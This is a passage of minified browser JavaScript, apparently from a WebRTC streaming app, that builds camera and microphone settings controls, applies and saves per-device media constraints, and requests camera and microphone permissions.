"+parseInt(e.target.value),getById("manualInput_"+e.target.dataset.keyname+"_"+e.target.dataset.deviceid).value=parseFloat(e.target.value),changeSubGain(e.target.value,e.target.dataset.deviceid),e.target.title=e.target.value,pokeIframeAPI("mic-constraint-changed",{name:e.target.dataset.keyname,value:e.target.value})},getById("popupSelector_constraints_audio").appendChild(div),div.appendChild(label),div.appendChild(manualInput),div.appendChild(input);break}}else warnlog("session.streamSrc contains no audio tracks")}function applyAudioHack(constraint,value=null,deviceid="default"){value==parseFloat(value)?(value=parseFloat(value),"channelCount"==constraint&&(session.audioInputChannels=value),value={exact:value}):"true"==value?value=!0:"false"==value&&(value=!1);try{var tracks=session.streamSrc.getAudioTracks();if(!tracks.length)return void warnlog("session.streamSrc contains no audio tracks");for(var track0=tracks[0],ii=0;ii<tracks.length;ii++)if(tracks[ii].id==deviceid){track0=tracks[ii];break}track0.getCapabilities?session.audioConstraints=track0.getCapabilities():Firefox&&(session.audioConstraints={autoGainControl:[!0,!1],deviceId:deviceid,echoCancellation:[!0,!1],noiseSuppression:[!0,!1]}),log(session.audioConstraints)}catch(e){return warnlog("session.streamSrc contains no audio tracks"),void errorlog(e)}try{track0.getSettings&&(session.currentAudioConstraints=track0.getSettings())}catch(e){errorlog(e)}var new_constraints=Object.assign(session.currentAudioConstraints,{[constraint]:value});new_constraints={audio:new_constraints,video:!1},log("new constraints"),log(new_constraints),activatedPreview=!1,enumerateDevices().then(gotDevices2).then((function(){grabAudio("#audioSource3",null,new_constraints,!1,saveAudioResult)}))}function saveAudioResult(){return!1}function updateAudioConstraints(constraint,value=null){try{var track0=session.streamSrc.getAudioTracks();track0=track0[0],value==parseFloat(value)?value=parseFloat(value):"true"==value?value=!0:"false"==value&&(value=!1),log({advanced:[{[constraint]:value}]}),track0.applyConstraints({advanced:[{[constraint]:value}]})}catch(e){errorlog(e)}}function listCameraSettings(){if(getById("popupSelector_constraints_video").innerHTML="",!0===session.controlRoomBitrate&&(session.controlRoomBitrate=session.totalRoomBitrate),session.roomid&&""!==session.view&&!1!==session.controlRoomBitrate){log("LISTING OPTION FOR BITRATE CONTROL");var i="room video bitrate (kbps)";(label=document.createElement("label")).htmlFor="constraints_"+i,label.innerText=capitalizeFirstLetter(i).replace(/([a-z])([A-Z])/g,"$1 $2")+":",label.title="If you're on a slow network, you can improve frame rate and audio quality by reducing the amount of video data that others send you",(input=document.createElement("input")).min=0,input.max=parseInt(session.totalRoomBitrate),"none"==getById("popupSelector_constraints_video").style.display&&(getById("advancedOptionsCamera").style.display="inline-flex"),input.value=session.controlRoomBitrate,label.innerHTML=i+": ",(manualInput=document.createElement("input")).type="number",manualInput.value=parseFloat(input.value),manualInput.className="manualInput",manualInput.id="label_"+i,input.type="range",input.dataset.keyname=i,input.id="constraints_"+i,input.style="display:block; width:100%;",input.name="constraints_"+i,input.title="If you're on a slow network, you can improve frame rate and audio quality by reducing the amount of video data that others send you",manualInput.onchange=function(e){getById("constraints_"+e.target.dataset.keyname).value=parseFloat(e.target.value),e.target.value>session.totalRoomBitrate||(session.controlRoomBitrate=parseInt(e.target.value),updateMixer(),pokeIframeAPI("camera-constraint-changed",{name:e.target.dataset.keyname,value:e.target.value}))},input.onchange=function(e){getById("label_"+e.target.dataset.keyname).value=parseFloat(e.target.value),e.target.value>session.totalRoomBitrate||(session.controlRoomBitrate=parseInt(e.target.value),updateMixer(),pokeIframeAPI("camera-constraint-changed",{name:e.target.dataset.keyname,value:e.target.value}))},getById("popupSelector_constraints_video").appendChild(label),getById("popupSelector_constraints_video").appendChild(manualInput),getById("popupSelector_constraints_video").appendChild(input)}try{var track0=session.streamSrc.getVideoTracks();track0.length&&((track0=track0[0]).getCapabilities?session.cameraConstraints=track0.getCapabilities():session.cameraConstraints={},log(session.cameraConstraints))}catch(e){return void errorlog(e)}try{track0.getSettings?(session.currentCameraConstraints=track0.getSettings(),screen&&screen.orientation&&screen.orientation.type?screen.orientation.type.includes("portrait")||session.currentCameraConstraints&&session.currentCameraConstraints.aspectRatio&&(session.currentCameraConstraints.aspectRatio=1/session.currentCameraConstraints.aspectRatio):window.matchMedia("(orientation: portrait)").matches||session.currentCameraConstraints&&session.currentCameraConstraints.aspectRatio&&(session.currentCameraConstraints.aspectRatio=1/session.currentCameraConstraints.aspectRatio)):session.currentCameraConstraints={}}catch(e){errorlog(e)}for(var i in session.cameraConstraints)try{if(log(i),log(session.cameraConstraints[i]),"focusMode"===i)continue;if("whiteBalanceMode"===i)continue;if("exposureMode"===i)continue;if("object"==typeof session.cameraConstraints[i]&&null!==session.cameraConstraints[i]&&"max"in session.cameraConstraints[i]&&"min"in session.cameraConstraints[i]){var manualInput,preSelectButton,manualMode=!1,manualLabel=!1;if("exposureTime"===i?session.currentCameraConstraints.exposureMode&&((manualMode=document.createElement("input")).type="checkbox",manualMode.id="manual_"+i,manualMode.dataset.keyname="exposureMode",manualMode.onchange=function(e){var value="manual";e.target.checked&&(value="continuous"),updateCameraConstraints(e.target.dataset.keyname,value,!!CtrlPressed,!1),pokeIframeAPI("camera-constraint-changed",{name:e.target.dataset.keyname,value:value})},(manualLabel=document.createElement("label")).htmlFor=manualMode.id,manualLabel.innerHTML="Auto: ",manualLabel.style.marginLeft="20px","continuous"==session.currentCameraConstraints.exposureMode&&(manualMode.checked=!0)):"focusDistance"===i?session.currentCameraConstraints.focusMode&&((manualMode=document.createElement("input")).type="checkbox",manualMode.id="manual_"+i,manualMode.dataset.keyname="focusMode",manualMode.onchange=function(e){var value="manual";e.target.checked&&(value="continuous"),updateCameraConstraints(e.target.dataset.keyname,value,!!CtrlPressed,!1),pokeIframeAPI("camera-constraint-changed",{name:e.target.dataset.keyname,value:value})},(manualLabel=document.createElement("label")).htmlFor=manualMode.id,manualLabel.innerHTML="Auto: ",manualLabel.style.marginLeft="20px","continuous"==session.currentCameraConstraints.focusMode&&(manualMode.checked=!0)):"colorTemperature"===i&&session.currentCameraConstraints.whiteBalanceMode&&((manualMode=document.createElement("input")).type="checkbox",manualMode.id="manual_"+i,manualMode.dataset.keyname="whiteBalanceMode",manualMode.onchange=function(e){var value="manual";e.target.checked&&(value="continuous"),updateCameraConstraints(e.target.dataset.keyname,value,!!CtrlPressed,!1),pokeIframeAPI("camera-constraint-changed",{name:e.target.dataset.keyname,value:value})},(manualLabel=document.createElement("label")).htmlFor=manualMode.id,manualLabel.innerHTML="Auto: ",manualLabel.style.marginLeft="20px","continuous"==session.currentCameraConstraints.whiteBalanceMode&&(manualMode.checked=!0)),(label=document.createElement("label")).htmlFor="constraints_"+i,label.innerText=capitalizeFirstLetter(i).replace(/([a-z])([A-Z])/g,"$1 $2")+":",(input=document.createElement("input")).min=parseFloat(session.cameraConstraints[i].min),"aspectRatio"===i?(input.max=5,input.min=.2):(input.min=parseFloat(session.cameraConstraints[i].min),input.max=parseFloat(session.cameraConstraints[i].max)),parseFloat(input.min)==parseFloat(input.max))continue;if("none"==getById("popupSelector_constraints_video").style.display&&(getById("advancedOptionsCamera").style.display="inline-flex"),(manualInput=document.createElement("input")).type="number",manualInput.dataset.keyname=i,manualInput.className="manualInput",manualInput.id="label_"+i,"step"in session.cameraConstraints[i]?(input.step=session.cameraConstraints[i].step,manualInput.step=session.cameraConstraints[i].step):"aspectRatio"===i&&(input.step=1e-6,manualInput.step=.005),i in session.currentCameraConstraints?(input.value=parseFloat(session.currentCameraConstraints[i]),manualInput.value=parseFloat(session.currentCameraConstraints[i]),label.title="Previously was:  "+session.currentCameraConstraints[i],input.title="Previously was:  "+session.currentCameraConstraints[i]):label.innerHTML=i,"height"!==i&&"width"!==i||(input.title="Hold CTRL (or cmd) to lock width and height together when changing them",input.min=16),input.type="range",input.dataset.keyname=i,input.id="constraints_"+i,input.style="display:block; width:100%;",input.name="constraints_"+i,manualInput.onchange=function(e){getById("constraints_"+e.target.dataset.keyname).value=parseFloat(e.target.value),updateCameraConstraints(e.target.dataset.keyname,e.target.value,!1,!1),pokeIframeAPI("camera-constraint-changed",{name:e.target.dataset.keyname,value:e.target.value})},input.oninput=function(e){getById("label_"+e.target.dataset.keyname).value=parseFloat(e.target.value),updateCameraConstraints(e.target.dataset.keyname,e.target.value,!!CtrlPressed,!1,!1)},input.onchange=function(e){getById("label_"+e.target.dataset.keyname).value=parseFloat(e.target.value),updateCameraConstraints(e.target.dataset.keyname,e.target.value,!!CtrlPressed,!1),pokeIframeAPI("camera-constraint-changed",{name:e.target.dataset.keyname,value:e.target.value})},getById("popupSelector_constraints_video").appendChild(label),getById("popupSelector_constraints_video").appendChild(manualInput),manualMode&&manualLabel&&(getById("popupSelector_constraints_video").appendChild(manualLabel),getById("popupSelector_constraints_video").appendChild(manualMode)),"aspectRatio"===i)(preSelectButton=document.createElement("button")).value=16/9,preSelectButton.innerText="16:9",preSelectButton.dataset.keyname=i,preSelectButton.className="preSelectButton",preSelectButton.onclick=function(e){getById("constraints_"+e.target.dataset.keyname).value=parseFloat(e.target.value),getById("label_"+e.target.dataset.keyname).value=parseFloat(e.target.value),updateCameraConstraints(e.target.dataset.keyname,e.target.value,!1,!1)},getById("popupSelector_constraints_video").appendChild(preSelectButton),(preSelectButton=document.createElement("button")).value=9/16,preSelectButton.innerText="9:16",preSelectButton.className="preSelectButton",preSelectButton.dataset.keyname=i,preSelectButton.onclick=function(e){getById("constraints_"+e.target.dataset.keyname).value=parseFloat(e.target.value),getById("label_"+e.target.dataset.keyname).value=parseFloat(e.target.value),updateCameraConstraints(e.target.dataset.keyname,e.target.value,!1,!1)},getById("popupSelector_constraints_video").appendChild(preSelectButton);getById("popupSelector_constraints_video").appendChild(input)}else if("object"==typeof session.cameraConstraints[i]&&null!==session.cameraConstraints[i]){if("resizeMode"==i)continue;var div=document.createElement("div");(label=document.createElement("label")).id="label_"+i,label.htmlFor="constraints_"+i,label.innerText=capitalizeFirstLetter(i).replace(/([a-z])([A-Z])/g,"$1 $2")+":",label.style="display:inline-block;",label.dataset.keyname=i;var input=document.createElement("select");if(session.cameraConstraints[i].length>1){var included=!1;for(var opts in session.cameraConstraints[i]){log(opts);var opt=new Option(session.cameraConstraints[i][opts],session.cameraConstraints[i][opts]);input.options.add(opt),i in session.currentCameraConstraints&&session.cameraConstraints[i][opts]==session.currentCameraConstraints[i]&&(opt.selected="true",included=!0)}if(!included&&i in session.currentCameraConstraints){opt=new Option(session.currentCameraConstraints[i],session.currentCameraConstraints[i]);input.options.add(opt),opt.selected="true"}}else if("torch"==i.toLowerCase){warnlog("TORCH");opt=new Option("Off",!1);input.options.add(opt),opt=new Option("On",!0),input.options.add(opt);try{session.currentCameraConstraints[i]&&(opt.selected="selected")}catch(e){}}else if(session.cameraConstraints[i].length&&"continuous"==session.cameraConstraints[i][0]){opt=new Option("continuous","continuous");if(input.options.add(opt),i in session.currentCameraConstraints)if("continuous"==session.currentCameraConstraints[i]){opt.selected="true";opt=new Option("manual","manual");input.options.add(opt);opt=new Option("none","none");input.options.add(opt)}else{opt=new Option(session.currentCameraConstraints[i],session.currentCameraConstraints[i]);if(input.options.add(opt),opt.selected="true","none"==session.currentCameraConstraints[i]){opt=new Option("manual","manual");input.options.add(opt)}else{opt=new Option("none","none");input.options.add(opt)}}else{opt.selected="true";opt=new Option("manual","manual");input.options.add(opt);opt=new Option("none","none");input.options.add(opt)}}else{if(!session.cameraConstraints[i].length||"manual"!=session.cameraConstraints[i][0])continue;opt=new Option("manual","manual");if(input.options.add(opt),i in session.currentCameraConstraints)if("manual"==session.currentCameraConstraints[i]){opt.selected="true";opt=new Option("continuous","continuous");input.options.add(opt);opt=new Option("none","none");input.options.add(opt)}else{opt=new Option(session.currentCameraConstraints[i],session.currentCameraConstraints[i]);if(input.options.add(opt),opt.selected="true","none"==session.currentCameraConstraints[i]){opt=new Option("continuous","continuous");input.options.add(opt)}else{opt=new Option("none","none");input.options.add(opt)}}else{opt.selected="true";opt=new Option("continuous","continuous");input.options.add(opt);opt=new Option("none","none");input.options.add(opt)}}"none"==getById("popupSelector_constraints_video").style.display&&(getById("advancedOptionsCamera").style.display="inline-flex"),input.id="constraints_"+i,input.className="constraintCameraInput",input.name="constraints_"+i,input.style="display:inline; padding:2px;",input.dataset.keyname=i,input.dataset.chosen=input.value,input.onchange=function(e){this.dataset.chosen=this.value,updateCameraConstraints(e.target.dataset.keyname,e.target.value,!!CtrlPressed,!1,!1),pokeIframeAPI("camera-constraint-changed",{name:e.target.dataset.keyname,value:e.target.value})},getById("popupSelector_constraints_video").appendChild(div),div.appendChild(label),div.appendChild(input)}else if("boolean"==typeof session.cameraConstraints[i]){var label;div=document.createElement("div");(label=document.createElement("label")).id="label_"+i,label.htmlFor="constraints_"+i,label.innerText=capitalizeFirstLetter(i).replace(/([a-z])([A-Z])/g,"$1 $2")+":",label.style="display:inline-block;",label.dataset.keyname=i;input=document.createElement("select"),opt=new Option("Off","false");input.options.add(opt),opt=new Option("On","true"),input.options.add(opt),session.currentCameraConstraints[i]&&(opt.selected="true"),"none"==getById("popupSelector_constraints_video").style.display&&(getById("advancedOptionsCamera").style.display="inline-flex"),input.id="constraints_"+i,input.className="constraintCameraInput",input.name="constraints_"+i,input.style="display:inline; padding:2px;",input.dataset.keyname=i,input.dataset.chosen=input.value,input.onchange=function(e){this.dataset.chosen=this.value,updateCameraConstraints(e.target.dataset.keyname,e.target.value,!!CtrlPressed,!1,!1),pokeIframeAPI("camera-constraint-changed",{name:e.target.dataset.keyname,value:e.target.value})},getById("popupSelector_constraints_video").appendChild(div),div.appendChild(label),div.appendChild(input)}}catch(e){errorlog(e)}if(session.currentCameraConstraints.deviceId&&getStorage("camera_"+session.currentCameraConstraints.deviceId)){var button=document.createElement("button");button.innerHTML="Reset video settings to default",button.style.display="block",button.style.padding="10px 5px",button.dataset.deviceId=session.currentCameraConstraints.deviceId,button.onclick=function(){var deviceId=this.dataset.deviceId,cameraSettings=getStorage("camera_"+deviceId),constraints={},resetResolution=!1,failed=!1;if(cameraSettings.default&&cameraSettings.current)for(var i in cameraSettings.default)if("groupId"!=i&&"aspectRatio"!==i){if("width"===i);else if("height"!==i){i in cameraSettings.current&&cameraSettings.current[i]!=cameraSettings.default[i]&&track0.applyConstraints({advanced:[{[i]:cameraSettings.default[i]}]}).then((()=>{})).catch((e=>{errorlog("Failed to reset to defaults"),failed=!0}));continue}if(i in cameraSettings.current&&cameraSettings.current[i]!=cameraSettings.default[i]){if(i in session.cameraConstraints){if("min"in session.cameraConstraints[i]&&session.cameraConstraints[i].min>cameraSettings.default[i])continue;if("max"in session.cameraConstraints[i]&&session.cameraConstraints[i].max<cameraSettings.default[i])continue}constraints[i]=cameraSettings.default[i],"width"!=i&&"height"!=i&&"aspectRatio"!=i||(resetResolution=!0)}}warnlog(constraints),Object.keys(constraints).length?track0.applyConstraints({advanced:[constraints]}).then((()=>{failed||removeStorage("camera_"+deviceId),listCameraSettings(),resetResolution&&session.setResolution()})).catch((e=>{errorlog("Failed to reset to defaults"),errorlog(e)})):failed||(removeStorage("camera_"+deviceId),listCameraSettings())},getById("popupSelector_constraints_video").appendChild(button)}}function applySavedAudioSettings(track0){if(track0.getSettings&&(log("applySavedAudioSettings"),session.currentAudioConstraints=track0.getSettings(),"deviceId"in session.currentAudioConstraints)){var deviceId=session.currentAudioConstraints.deviceId;if(getStorage("audio_"+deviceId)){var audioSettings=getStorage("audio_"+deviceId),constraints={};if(audioSettings.deviceId)for(var i in session.currentAudioConstraints)if(i in audioSettings&&audioSettings[i]!=session.currentAudioConstraints[i]){if("autoGainControl"==i);else if("echoCancellation"==i);else if("noiseSuppression"!=i)continue;constraints[i]=audioSettings[i],warnlog("DIFF: "+i)}warnlog(constraints),Object.keys(constraints).length&&track0.applyConstraints({advanced:[constraints]}).then((()=>{warnlog("audio settings updated for deviceId:"+deviceId)})).catch((e=>{errorlog("Failed to reset to audio defaults")}))}}}function applySavedVideoSettings(track0){if(track0.getSettings&&(session.currentCameraConstraints=track0.getSettings(),screen&&screen.orientation&&screen.orientation.type?screen.orientation.type.includes("portrait")||session.currentCameraConstraints&&session.currentCameraConstraints.aspectRatio&&(session.currentCameraConstraints.aspectRatio=1/session.currentCameraConstraints.aspectRatio):window.matchMedia("(orientation: portrait)").matches||session.currentCameraConstraints&&session.currentCameraConstraints.aspectRatio&&(session.currentCameraConstraints.aspectRatio=1/session.currentCameraConstraints.aspectRatio),"deviceId"in session.currentCameraConstraints)){var deviceId=session.currentCameraConstraints.deviceId;if(getStorage("camera_"+deviceId)){var cameraSettings=getStorage("camera_"+deviceId),constraints={};if(cameraSettings.current)for(var i in session.currentCameraConstraints)if(i in cameraSettings.current&&cameraSettings.current[i]!=session.currentCameraConstraints[i]){if("groupId"==i)continue;if(session.forceAspectRatio&&"aspectRatio"===i){log("Skipping saved AspectRatio setting");continue}if(session.whiteBalance&&"whiteBalanceMode"===i){log("This is manaually set via URL");continue}if(session.whiteBalance&&"colorTemperature"===i){log("This is manaually set via URL");continue}if(session.exposure&&"exposureTime"===i){log("This is manaually set via URL");continue}if(session.exposure&&"exposureMode"===i){log("This is manaually set via URL");continue}if(session.saturation&&"saturation"===i){log("This is manaually set via URL");continue}if(session.sharpness&&"sharpness"===i){log("This is manaually set via URL");continue}if(session.contrast&&"contrast"===i){log("This is manaually set via URL");continue}if(session.brightness&&"brightness"===i){log("This is manaually set via URL");continue}constraints[i]=cameraSettings.current[i],warnlog("DIFF: "+i)}warnlog(constraints),Object.keys(constraints).length&&track0.applyConstraints({advanced:[constraints]}).then((()=>{warnlog("video settings updated for deviceId:"+deviceId)})).catch((e=>{errorlog("Failed to reset to defaults")}))}}}var updateCameraConstraintsBusy=!1,updateCameraConstraintsNext=!1;async function updateCameraConstraints(constraint,value=null,ctrl=!1,UUID=!1,save=!0){if("zoom"!==constraint||0!==value)if(log("updateCameraConstraintsBusy..?"),updateCameraConstraintsBusy)updateCameraConstraintsNext=[constraint,value,ctrl,UUID,save];else{updateCameraConstraintsBusy=!0,updateCameraConstraintsNext=!1;try{var track0=session.streamSrc.getVideoTracks();(!(track0=track0[0])||track0.readyState&&"live"!=track0.readyState||!track0.enabled)&&(save||(errorlog("TRACK IS NOT ENABLED"),updateCameraConstraintsBusy=!1,updateCameraConstraintsNext=!1)),value==parseFloat(value)?value=parseFloat(value):"true"==value?value=!0:"false"==value&&(value=!1),log({advanced:[{[constraint]:value}]})}catch(e){return errorlog(e),updateCameraConstraintsBusy=!1,updateCameraConstraintsNext=!1,e}log("updateCameraConstraintsNext:"),log(updateCameraConstraintsNext);try{if(track0.getSettings){var cameraSettings={};session.currentCameraConstraints=track0.getSettings(),screen&&screen.orientation&&screen.orientation.type?screen.orientation.type.includes("portrait")||session.currentCameraConstraints&&session.currentCameraConstraints.aspectRatio&&(session.currentCameraConstraints.aspectRatio=1/session.currentCameraConstraints.aspectRatio):window.matchMedia("(orientation: portrait)").matches||session.currentCameraConstraints&&session.currentCameraConstraints.aspectRatio&&(session.currentCameraConstraints.aspectRatio=1/session.currentCameraConstraints.aspectRatio),session.currentCameraConstraints.deviceId&&(getStorage("camera_"+session.currentCameraConstraints.deviceId)?cameraSettings=getStorage("camera_"+session.currentCameraConstraints.deviceId):(cameraSettings.default=JSON.parse(JSON.stringify(session.currentCameraConstraints)),log(cameraSettings.default)))}}catch(e){errorlog(e)}if("width"==constraint){var constraits={width:value};session.currentCameraConstraints&&session.currentCameraConstraints.frameRate&&(constraits.frameRate=session.currentCameraConstraints.frameRate),screen&&screen.orientation&&screen.orientation.type?!screen.orientation.type.includes("portrait")&&session.currentCameraConstraints&&!ctrl&&session.currentCameraConstraints.height&&(constraits.height=session.currentCameraConstraints.height):!window.matchMedia("(orientation: portrait)").matches&&session.currentCameraConstraints&&!ctrl&&session.currentCameraConstraints.height&&(constraits.height=session.currentCameraConstraints.height)}else if("height"==constraint){constraits={height:value};session.currentCameraConstraints&&session.currentCameraConstraints.frameRate&&(constraits.frameRate=session.currentCameraConstraints.frameRate),screen&&screen.orientation&&screen.orientation.type?!screen.orientation.type.includes("portrait")&&session.currentCameraConstraints&&!ctrl&&session.currentCameraConstraints.width&&(constraits.width=session.currentCameraConstraints.width):!window.matchMedia("(orientation: portrait)").matches&&session.currentCameraConstraints&&!ctrl&&session.currentCameraConstraints.width&&(constraits.width=session.currentCameraConstraints.width)}else if(ctrl||"frameRate"!=constraint)if("exposureMode"==constraint&&"manual"==value){constraits={};session.currentCameraConstraints&&session.currentCameraConstraints.exposureTime&&(constraits.exposureTime=session.currentCameraConstraints.exposureTime),await track0.applyConstraints({advanced:[constraits]}),session.currentCameraConstraints=track0.getSettings(),screen&&screen.orientation&&screen.orientation.type?screen.orientation.type.includes("portrait")||session.currentCameraConstraints&&session.currentCameraConstraints.aspectRatio&&(session.currentCameraConstraints.aspectRatio=1/session.currentCameraConstraints.aspectRatio):window.matchMedia("(orientation: portrait)").matches||session.currentCameraConstraints&&session.currentCameraConstraints.aspectRatio&&(session.currentCameraConstraints.aspectRatio=1/session.currentCameraConstraints.aspectRatio);constraits={[constraint]:value};session.currentCameraConstraints&&session.currentCameraConstraints.exposureTime&&(constraits.exposureTime=session.currentCameraConstraints.exposureTime)}else if("exposureTime"==constraint)constraits={[constraint]:value,exposureMode:"manual"};else if("focusMode"==constraint&&"manual"==value){constraits={};session.currentCameraConstraints&&session.currentCameraConstraints.focusDistance&&(constraits.focusDistance=session.currentCameraConstraints.focusDistance),await track0.applyConstraints({advanced:[constraits]}),session.currentCameraConstraints=track0.getSettings(),screen&&screen.orientation&&screen.orientation.type?screen.orientation.type.includes("portrait")||session.currentCameraConstraints&&session.currentCameraConstraints.aspectRatio&&(session.currentCameraConstraints.aspectRatio=1/session.currentCameraConstraints.aspectRatio):window.matchMedia("(orientation: portrait)").matches||session.currentCameraConstraints&&session.currentCameraConstraints.aspectRatio&&(session.currentCameraConstraints.aspectRatio=1/session.currentCameraConstraints.aspectRatio);constraits={[constraint]:value};session.currentCameraConstraints&&session.currentCameraConstraints.focusDistance&&(constraits.focusDistance=session.currentCameraConstraints.focusDistance)}else if("focusDistance"==constraint)constraits={[constraint]:value,focusMode:"manual"};else if("whiteBalanceMode"==constraint&&"manual"==value){constraits={};session.currentCameraConstraints&&session.currentCameraConstraints.colorTemperature&&(constraits.colorTemperature=session.currentCameraConstraints.colorTemperature),await track0.applyConstraints({advanced:[constraits]}),session.currentCameraConstraints=track0.getSettings(),screen&&screen.orientation&&screen.orientation.type?screen.orientation.type.includes("portrait")||session.currentCameraConstraints&&session.currentCameraConstraints.aspectRatio&&(session.currentCameraConstraints.aspectRatio=1/session.currentCameraConstraints.aspectRatio):window.matchMedia("(orientation: portrait)").matches||session.currentCameraConstraints&&session.currentCameraConstraints.aspectRatio&&(session.currentCameraConstraints.aspectRatio=1/session.currentCameraConstraints.aspectRatio);constraits={[constraint]:value};session.cameraConstraints.colorTemperature&&"max"in session.cameraConstraints.colorTemperature&&"min"in session.cameraConstraints.colorTemperature&&(session.currentCameraConstraints&&session.currentCameraConstraints.colorTemperature?constraits.colorTemperature=session.currentCameraConstraints.colorTemperature:5e3>=session.cameraConstraints.colorTemperature.min&&5e3<=session.cameraConstraints.colorTemperature.max?constraits.colorTemperature=5e3:constraits.colorTemperature=session.cameraConstraints.colorTemperature.max)}else if("whiteBalanceMode"==constraint&&"continuous"==value){constraits={[constraint]:value};session.mobile&&ChromiumVersion&&(constraits.colorTemperature=5e3)}else if("colorTemperature"==constraint)constraits={[constraint]:value,whiteBalanceMode:"manual"};else if("aspectRatio"==constraint){constraits={[constraint]:value};session.currentCameraConstraints&&session.currentCameraConstraints.frameRate&&(constraits.frameRate=session.currentCameraConstraints.frameRate)}else constraits={[constraint]:value};else{var constraits={frameRate:value};screen&&screen.orientation&&screen.orientation.type?!screen.orientation.type.includes("portrait")&&session.currentCameraConstraints&&session.currentCameraConstraints.height&&session.currentCameraConstraints.width&&(constraits.height=session.currentCameraConstraints.height,constraits.width=session.currentCameraConstraints.width):!window.matchMedia("(orientation: portrait)").matches&&session.currentCameraConstraints&&session.currentCameraConstraints.height&&session.currentCameraConstraints.width&&(constraits.height=session.currentCameraConstraints.height,constraits.width=session.currentCameraConstraints.width)}screen&&screen.orientation&&screen.orientation.type?screen.orientation.type.includes("portrait")&&constraits.aspectRatio&&(constraits.aspectRatio=1/constraits.aspectRatio):window.matchMedia("(orientation: portrait)").matches&&constraits.aspectRatio&&(constraits.aspectRatio=1/constraits.aspectRatio),log("20788"),log(constraits),await track0.applyConstraints({advanced:[constraits]}).then((()=>{if(log("applied constraint"),save){if(track0.getSettings&&session.currentCameraConstraints.deviceId&&(session.currentCameraConstraints=track0.getSettings(),screen&&screen.orientation&&screen.orientation.type?screen.orientation.type.includes("portrait")||session.currentCameraConstraints&&session.currentCameraConstraints.aspectRatio&&(session.currentCameraConstraints.aspectRatio=1/session.currentCameraConstraints.aspectRatio):window.matchMedia("(orientation: portrait)").matches||session.currentCameraConstraints&&session.currentCameraConstraints.aspectRatio&&(session.currentCameraConstraints.aspectRatio=1/session.currentCameraConstraints.aspectRatio),cameraSettings.current=session.currentCameraConstraints,setStorage("camera_"+session.currentCameraConstraints.deviceId,cameraSettings),1==toggleSettingsState&&listCameraSettings()),UUID){var data={};data.UUID=UUID,data.videoOptions=listVideoSettingsPrep(),sendMediaDevices(data.UUID),session.sendMessage(data,data.UUID)}"width"!=constraint&&"height"!=constraint&&"aspectRatio"!=constraint||session.setResolution()}updateCameraConstraintsNext?setTimeout((function(){updateCameraConstraintsBusy=!1,updateCameraConstraints(updateCameraConstraintsNext[0],updateCameraConstraintsNext[1],updateCameraConstraintsNext[2],updateCameraConstraintsNext[3],updateCameraConstraintsNext[4])}),30):updateCameraConstraintsBusy=!1})).catch((e=>{errorlog(e.message),errorlog("coulnd't save defaults"),window.focus(),updateCameraConstraintsBusy=!1,updateCameraConstraintsNext=!1}))}else log("can't zoom to zero")}function toggleAudioUser(ele){ele?(ele=ele||getById("advancedOptionsAudio"),toggle(getById("popupSelector_constraints_audio"),!1,!1),ele.classList.toggle("highlight")):((ele=ele||getById("advancedOptionsAudio")).style.display="inline-flex","block"==getById("popupSelector_constraints_audio").style.display?toggleSettings():(getById("popupSelector_constraints_audio").style.display="block",ele.classList.add("highlight"),toggleSettingsState||toggleSettings())),getById("popupSelector_constraints_loading").style.visibility="visible",getById("popupSelector_constraints_video").style.display="none",getById("popupSelector_user_settings").style.display="none"}function toggleVideoUser(ele){ele?(ele=ele||getById("advancedOptionsCamera"),toggle(getById("popupSelector_constraints_video"),!1,!1),ele.classList.toggle("highlight")):((ele=ele||getById("advancedOptionsCamera")).style.display="inline-flex","block"==getById("popupSelector_constraints_video").style.display?toggleSettings():(getById("popupSelector_constraints_video").style.display="block",ele.classList.add("highlight"),toggleSettingsState||toggleSettings())),getById("popupSelector_constraints_loading").style.visibility="visible",getById("popupSelector_constraints_audio").style.display="none",getById("popupSelector_user_settings").style.display="none"}function toggleUserUser(ele){ele=ele||getById("advancedOptionsGeneral"),toggleSettingsState||toggleSettings(),ele.classList.toggle("highlight"),toggle(getById("popupSelector_user_settings"),!1,!1),getById("popupSelector_user_settings").style.visibility="visible",getById("popupSelector_constraints_video").style.display="none",getById("popupSelector_constraints_audio").style.display="none"}async function requestBasicPermissions(constraint={video:!0,audio:!0},callback=setupWebcamSelection,miconly=!1){if(null===session.taintedSession)return log("STILL WAITING ON HASH TO VALIDATE"),setTimeout((function(constraint,callback,miconly){requestBasicPermissions(constraint,callback,miconly)}),1e3,constraint,callback,miconly),null;if(!0===session.taintedSession)return warnlog("HASH FAILED; PASSWORD NOT VALID"),!1;log("NOT TAINTED 1"),setTimeout((function(){getById("getPermissions").style.display="none",getById("gowebcam").style.display=""}),0),log("REQUESTING BASIC PERMISSIONS");try{var timerBasicCheck=null;session.cleanOutput||(log("Setting Timer for getUserMedia"),timerBasicCheck=setTimeout((function(){session.cleanOutput||(session.mobile?warnUser("Notice: Camera timed out\n\nDid you accept the camera permissions?\n\nThis error may also appear if you are in a phone call or another app is already using the camera or microphone."):warnUser("Camera Access Request Timed Out\nDid you accept camera permissions? Please do so first.\n\nOtherwise, do you have NDI Tools installed? Maybe try uninstalling NDI tools.\n\nPlease also ensure that your camera and audio devices are correctly connected and not already in use. You may also need to refresh the page."))}),1e4)),session.audioInputChannels&&(!0===constraint.audio?(constraint.audio={},constraint.audio.channelCount=session.audioInputChannels):constraint.audio&&(constraint.audio.channelCount=session.audioInputChannels)),session.micSampleRate&&(!0===constraint.audio?(constraint.audio={},constraint.audio.sampleRate=parseInt(session.micSampleRate)):constraint.audio&&(constraint.audio.sampleRate=parseInt(session.micSampleRate))),session.micSampleSize&&(!0===constraint.audio?(constraint.audio={},constraint.audio.sampleSize=parseInt(session.micSampleSize)):constraint.audio&&(constraint.audio.sampleSize=parseInt(session.micSampleSize))),session.safemode&&(constraint.video&&(constraint.video=!0),constraint.audio&&(constraint.audio=!0));var gumID=getUserMediaRequestID+=1;log("CONSTRAINT"),log(constraint);var timeoutStart=0;Firefox&&(timeoutStart=500),log("timeoutStart :"+timeoutStart),setTimeout((async function(gumID,constraint,timerBasicCheck,callback,miconly){log("gumID: "+gumID);var removeAudio=!1;constraint.audio||constraint.video||(constraint.audio=!0,removeAudio=!0);let videoPermission="prompt",audioPermission="prompt";try{videoPermission=(await navigator.permissions.query({name:"camera"})).state;audioPermission=(await navigator.permissions.query({name:"microphone"})).state}catch(e){warnlog("Permissions API is not fully supported in this browser.")}if("granted"===videoPermission&&(constraint.video=!1),"granted"===audioPermission&&(constraint.audio=!1),!constraint.audio&&!constraint.video)return warnlog("bypassing navigator.mediaDevices.getUserMedia; permissions granted already?"),clearTimeout(timerBasicCheck),getUserMediaRequestID!==gumID?void 